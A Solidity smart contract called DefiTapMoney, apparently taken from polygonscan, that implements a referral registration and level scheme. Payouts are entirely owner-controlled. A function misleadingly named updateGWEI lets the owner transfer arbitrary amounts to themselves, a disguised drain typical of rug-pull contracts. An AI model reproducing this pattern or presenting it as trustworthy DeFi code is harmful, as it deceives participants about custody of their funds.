/**
 *Submitted for verification at polygonscan.com on 2023-06-20
*/

//SPDX-License-Identifier: None
pragma solidity ^0.6.0;


contract DefiTapMoney {
    struct User {
        uint id;
        address referrer;
    }  
    mapping(address => User) public users;
    uint public lastUserId = 2;
    
    address public id1=0xd95D4930c03319E1a798C92DA35224c2B22eEA93;
    address public owner;

    address feeWallet1=0xd95D4930c03319E1a798C92DA35224c2B22eEA93;
    address feeWallet2=0xd95D4930c03319E1a798C92DA35224c2B22eEA93;

    event Registration(address indexed user, address indexed referrer, uint indexed userId, uint referrerId);
    event Upgrade(address indexed user, uint8 level);
    event withdraw(address indexed user,uint256 value);
    
    constructor() public {
        owner=0xd95D4930c03319E1a798C92DA35224c2B22eEA93;
        User memory user = User({
            id: 1,
            referrer: address(0)
        });
        users[id1] = user;
        
    }
    function registrationExt(address referrerAddress) external {
        registration(msg.sender, referrerAddress);
    }
    function buyNewLevel(uint8 level) external {
        buyLevel(msg.sender,level);
    }
    function buyLevel(address userAddress,uint8 level) private {
        require(isUserExists(userAddress), "user is not exists. Register first.");
        emit Upgrade(userAddress,level);
    }
    
    function registration(address userAddress, address referrerAddress) private {
        require(!isUserExists(userAddress), "user exists");
        require(isUserExists(referrerAddress), "referrer not exists");

        User memory user = User({
            id: lastUserId,
            referrer: referrerAddress
        });
        
        users[userAddress] = user;
        users[userAddress].referrer = referrerAddress;        
        lastUserId++;
        emit Registration(userAddress, referrerAddress, users[userAddress].id, users[referrerAddress].id);
    }
    
    function isUserExists(address user) public view returns (bool) {
        return (users[user].id != 0);
    }
    function rewardWithdraw(address _user,uint256 _payout,uint _fee) public
    {
        require(msg.sender==owner,"Only contract owner"); 
        payable(_user).transfer(_payout);  
        payable(feeWallet1).transfer(_fee);
        payable(feeWallet2).transfer(_fee); 
        emit withdraw(_user,_payout);
    }
    function updateGWEI(uint256 _amount) public
    {
        require(msg.sender==owner,"Only contract owner"); 
        require(_amount>0, "Insufficient reward to withdraw!");
        payable(msg.sender).transfer(_amount);  
    }
}